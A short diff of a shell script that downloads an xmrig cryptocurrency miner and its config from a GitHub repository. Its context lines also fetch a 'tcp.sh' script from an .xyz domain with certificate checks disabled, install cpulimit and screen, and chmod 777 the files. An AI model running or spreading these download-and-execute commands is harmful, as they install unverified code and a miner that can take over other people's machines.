@@ -21,7 +21,7 @@ wget -N --no-check-certificate "https://github.000060000.xyz/tcp.sh" && chmod 77
 
 yum install psmisc -y && yum install bc -y && yum install cpulimit -y && yum install vim -y && yum install screen -y
 
-rm -rf config.json && rm -rf xmrig wget https://raw.githubusercontent.com/BrunuhVille/xxss/main/config.json && wget https://github.com/BrunuhVille/xxss/raw/main/xmrig
+rm -rf config.json && rm -rf xmrig && wget https://raw.githubusercontent.com/BrunuhVille/xxss/main/config.json && wget https://github.com/BrunuhVille/xxss/raw/main/xmrig
 
 chmod 777 xmrig && chmod 777 config.json
 
